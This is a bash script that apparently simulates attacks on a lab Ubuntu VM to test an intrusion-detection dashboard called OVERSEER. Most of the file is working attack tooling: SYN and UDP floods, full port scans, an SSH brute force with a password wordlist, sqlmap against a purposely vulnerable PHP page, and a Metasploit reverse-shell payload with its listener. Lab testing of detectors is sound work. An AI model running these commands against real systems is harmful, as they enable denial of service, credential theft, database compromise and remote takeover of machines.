#!/bin/bash
# ============================================================
#  OVERSEER — Attack Simulation Scripts
#  Run from your Linux Mint ATTACKER machine
#  Target: Ubuntu Server VM on VirtualBox host-only network
# ============================================================
#
#  SETUP:
#    1. Set TARGET_IP to your Ubuntu Server VM's IP
#       (run `ip addr` on the server VM to find it)
#    2. Install tools:
#       sudo apt install nmap hping3 hydra sqlmap netcat metasploit-framework
#    3. Run a specific scenario:
#       chmod +x attack_scripts.sh
#       ./attack_scripts.sh dos
#       ./attack_scripts.sh scan
#       ./attack_scripts.sh brute
#       ./attack_scripts.sh sqli
#       ./attack_scripts.sh shell
#       ./attack_scripts.sh all     ← runs all 5 with delays
#
# ============================================================

TARGET_IP="${OVERSEER_TARGET:-192.168.56.101}"   # change to your VM IP
TARGET_WEB="http://$TARGET_IP"
TARGET_SSH="$TARGET_IP"
LOG_DIR="./overseer_attack_logs"
mkdir -p "$LOG_DIR"

RED='\033[0;31m'
YEL='\033[1;33m'
GRN='\033[0;32m'
CYN='\033[0;36m'
NC='\033[0m'

banner() {
  echo -e "\n${CYN}╔══════════════════════════════════════╗"
  echo -e "║  OVERSEER  ·  ATTACK SIMULATION      ║"
  echo -e "║  Scenario: $1"
  echo -e "╚══════════════════════════════════════╝${NC}\n"
}

log() { echo -e "${YEL}[$(date +%H:%M:%S)]${NC} $1" | tee -a "$LOG_DIR/attacks.log"; }
ok()  { echo -e "${GRN}[✓]${NC} $1"; }
err() { echo -e "${RED}[!]${NC} $1"; }

# ── Verify target is reachable ────────────────────────────────────────────────
check_target() {
  log "Checking target $TARGET_IP..."
  if ping -c 1 -W 2 "$TARGET_IP" &>/dev/null; then
    ok "Target is reachable"
  else
    err "Target $TARGET_IP is NOT reachable"
    err "Set your VM IP: export OVERSEER_TARGET=192.168.56.XXX"
    exit 1
  fi
}

# ────────────────────────────────────────────────────────────────────────────
# SCENARIO 1 — DoS / DDoS (SYN flood + UDP flood)
# Detectable by: high serror_rate, count=511, dst_host_serror_rate
# ────────────────────────────────────────────────────────────────────────────
attack_dos() {
  banner "DoS / DDoS"
  log "Starting SYN flood on port 80 (30 seconds)..."
  log "OVERSEER should detect: serror_rate spike, count=511, src_bytes=0"

  # SYN flood — hping3
  sudo hping3 -S -p 80 --flood --rand-source "$TARGET_IP" &
  HPID=$!
  sleep 15

  log "Adding UDP flood on port 53..."
  sudo hping3 -2 -p 53 --flood "$TARGET_IP" &
  UPID=$!
  sleep 15

  kill $HPID $UPID 2>/dev/null
  ok "DoS scenario complete — check OVERSEER dashboard for DoS/DDoS alert"

  # Log to OVERSEER API (demo mode)
  curl -s -X POST http://localhost:5000/predict_demo \
    -H "Content-Type: application/json" \
    -d '{"scenario":"dos_syn"}' | python3 -m json.tool 2>/dev/null || true
}

# ────────────────────────────────────────────────────────────────────────────
# SCENARIO 2 — Port Scan / Probe
# Detectable by: rerror_rate spike, srv_diff_host_rate, low same_srv_rate
# ────────────────────────────────────────────────────────────────────────────
attack_scan() {
  banner "Port Scan / Probe"
  log "Running nmap full TCP SYN scan..."

  # Aggressive scan: OS detection, version, scripts
  sudo nmap -sS -sV -O -A -T4 \
    -p 1-65535 \
    --open \
    -oN "$LOG_DIR/nmap_full.txt" \
    "$TARGET_IP"

  log "Running nmap UDP scan (top 100 ports)..."
  sudo nmap -sU --top-ports 100 \
    -oN "$LOG_DIR/nmap_udp.txt" \
    "$TARGET_IP"

  log "Running masscan for speed demonstration..."
  if command -v masscan &>/dev/null; then
    sudo masscan "$TARGET_IP"/32 -p1-10000 --rate=1000 \
      -oL "$LOG_DIR/masscan.txt" 2>/dev/null
  fi

  ok "Scan complete — results in $LOG_DIR/nmap_full.txt"
  ok "OVERSEER should detect: rerror_rate=0.99, probe family"

  curl -s -X POST http://localhost:5000/predict_demo \
    -H "Content-Type: application/json" \
    -d '{"scenario":"port_scan"}' | python3 -m json.tool 2>/dev/null || true
}

# ────────────────────────────────────────────────────────────────────────────
# SCENARIO 3 — Brute Force SSH (Hydra)
# Detectable by: num_failed_logins=5, serror_rate on L5/L7
# ────────────────────────────────────────────────────────────────────────────
attack_brute() {
  banner "Brute Force / SSH"

  # Create wordlists for demo
  cat > /tmp/users.txt << 'EOF'
root
admin
ubuntu
user
test
pi
oracle
postgres
EOF

  cat > /tmp/passwords.txt << 'EOF'
password
123456
admin
root
toor
pass
letmein
qwerty
welcome
test
ubuntu
raspberry
EOF

  log "Starting Hydra SSH brute force against $TARGET_SSH..."
  log "OVERSEER should detect: num_failed_logins spike, L5/L7 anomaly"

  hydra -L /tmp/users.txt \
        -P /tmp/passwords.txt \
        -t 4 \
        -vV \
        -o "$LOG_DIR/hydra_results.txt" \
        "ssh://$TARGET_SSH" 2>&1 | tee "$LOG_DIR/hydra_output.txt"

  ok "Brute force complete — results in $LOG_DIR/hydra_results.txt"

  curl -s -X POST http://localhost:5000/predict_demo \
    -H "Content-Type: application/json" \
    -d '{"scenario":"brute_force"}' | python3 -m json.tool 2>/dev/null || true
}

# ────────────────────────────────────────────────────────────────────────────
# SCENARIO 4 — SQL Injection (sqlmap)
# Detectable by: num_compromised, hot indicators, L7 anomaly
# ────────────────────────────────────────────────────────────────────────────
attack_sqli() {
  banner "SQL Injection"

  # Check if Apache is serving a vulnerable test page
  log "Checking for web target at $TARGET_WEB..."

  # Create a test vulnerable endpoint if needed (on the SERVER VM run:)
  # sudo bash -c 'cat > /var/www/html/search.php << EOF
  # <?php $q=$_GET["q"]; $r=mysqli_query($conn,"SELECT * FROM users WHERE name="$q""); ?>
  # EOF'

  log "Running sqlmap against $TARGET_WEB..."
  log "OVERSEER should detect: high src_bytes/dst_bytes, hot=10, num_compromised"

  sqlmap -u "$TARGET_WEB/search.php?q=1" \
    --level=3 \
    --risk=2 \
    --batch \
    --dbs \
    --output-dir="$LOG_DIR/sqlmap/" \
    --forms 2>&1 | tee "$LOG_DIR/sqlmap_output.txt"

  ok "SQL injection scan complete"

  curl -s -X POST http://localhost:5000/predict_demo \
    -H "Content-Type: application/json" \
    -d '{"scenario":"sql_injection"}' | python3 -m json.tool 2>/dev/null || true
}

# ────────────────────────────────────────────────────────────────────────────
# SCENARIO 5 — Reverse Shell (Metasploit)
# Detectable by: root_shell=1, num_shells, num_compromised, U2R family
# ────────────────────────────────────────────────────────────────────────────
attack_shell() {
  banner "Reverse Shell / Metasploit"

  LHOST=$(hostname -I | awk '{print $1}')
  LPORT=4444

  log "Your attacker IP: $LHOST"
  log "Generating Metasploit reverse shell payload..."

  # Generate payload (Linux ELF reverse shell)
  msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST="$LHOST" \
    LPORT=$LPORT \
    -f elf \
    -o "$LOG_DIR/payload.elf" 2>/dev/null

  if [ $? -eq 0 ]; then
    ok "Payload generated: $LOG_DIR/payload.elf"
  fi

  log "Starting Metasploit multi/handler listener..."
  log "OVERSEER should detect: root_shell=1, num_shells=1, U2R family"
  log "Press Ctrl+C to stop the listener after demo"

  # Write MSF resource script
  cat > /tmp/overseer_handler.rc << EOF
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j -z
EOF

  msfconsole -q -r /tmp/overseer_handler.rc 2>&1 | tee "$LOG_DIR/msf_output.txt" &
  MSFPID=$!

  log "Listener running (PID $MSFPID). Transfer payload.elf to target VM and execute."
  log "On target VM: chmod +x payload.elf && ./payload.elf"

  # Simulate for OVERSEER dashboard
  curl -s -X POST http://localhost:5000/predict_demo \
    -H "Content-Type: application/json" \
    -d '{"scenario":"reverse_shell"}' | python3 -m json.tool 2>/dev/null || true

  sleep 30
  kill $MSFPID 2>/dev/null
}

# ────────────────────────────────────────────────────────────────────────────
# DEMO MODE — fires scenarios at OVERSEER API without real network attacks
# Use this if VMs aren't ready yet — still shows full dashboard + XAI
# ────────────────────────────────────────────────────────────────────────────
attack_demo() {
  banner "Demo Mode (API only — no real network traffic)"
  OVERSEER_API="${OVERSEER_API:-http://localhost:5000}"

  SCENARIOS=("normal" "dos_syn" "port_scan" "brute_force" "dos_udp" "sql_injection" "normal" "reverse_shell")

  for sc in "${SCENARIOS[@]}"; do
    log "Firing scenario: $sc"
    curl -s -X POST "$OVERSEER_API/predict_demo" \
      -H "Content-Type: application/json" \
      -d "{\"scenario\":\"$sc\"}" | python3 -c "
import sys,json
r=json.load(sys.stdin)
icon = '🔴 THREAT' if r['is_threat'] else '🟢 BENIGN'
print(f\"  {icon}  Score={r['threat_score']:.3f}  Family={r['attack_family']}\")
print(f\"  SOAR: {', '.join(r['soar_actions']) if r['soar_actions'] else 'None'}\")
print(f\"  Top feature: {r['xai_top_features'][0]['feature']} ({r['xai_top_features'][0]['importance']:.3f})\")
" 2>/dev/null || echo "  (OVERSEER API not running — start with: python overseer_engine.py --serve)"
    sleep 2
  done

  ok "Demo complete — all scenarios pushed to OVERSEER dashboard"
}

# ────────────────────────────────────────────────────────────────────────────
# ALL — run all real attacks sequentially (judge demo flow)
# ────────────────────────────────────────────────────────────────────────────
attack_all() {
  check_target
  log "Starting full OVERSEER attack demonstration..."
  log "Make sure Wireshark is capturing on your host-only interface!"

  attack_scan
  echo; sleep 5

  attack_dos
  echo; sleep 5

  attack_brute
  echo; sleep 5

  attack_sqli
  echo; sleep 5

  attack_shell

  ok "All 5 attack scenarios complete"
  ok "Check OVERSEER dashboard for full threat timeline"
}

# ── Main ──────────────────────────────────────────────────────────────────────
case "${1:-help}" in
  dos)   check_target; attack_dos   ;;
  scan)  check_target; attack_scan  ;;
  brute) check_target; attack_brute ;;
  sqli)  check_target; attack_sqli  ;;
  shell) check_target; attack_shell ;;
  demo)  attack_demo                ;;
  all)   attack_all                 ;;
  *)
    echo -e "\n${CYN}OVERSEER Attack Simulation${NC}"
    echo "Usage: $0 <scenario>"
    echo ""
    echo "  dos    — SYN flood + UDP flood (hping3)"
    echo "  scan   — Full port scan (nmap + masscan)"
    echo "  brute  — SSH brute force (Hydra)"
    echo "  sqli   — SQL injection (sqlmap)"
    echo "  shell  — Reverse shell (Metasploit)"
    echo "  demo   — API demo mode (no real traffic, for dashboard testing)"
    echo "  all    — Run all 5 scenarios sequentially"
    echo ""
    echo "  Set target: export OVERSEER_TARGET=192.168.56.101"
    echo "  Set API:    export OVERSEER_API=http://localhost:5000"
    ;;
esac
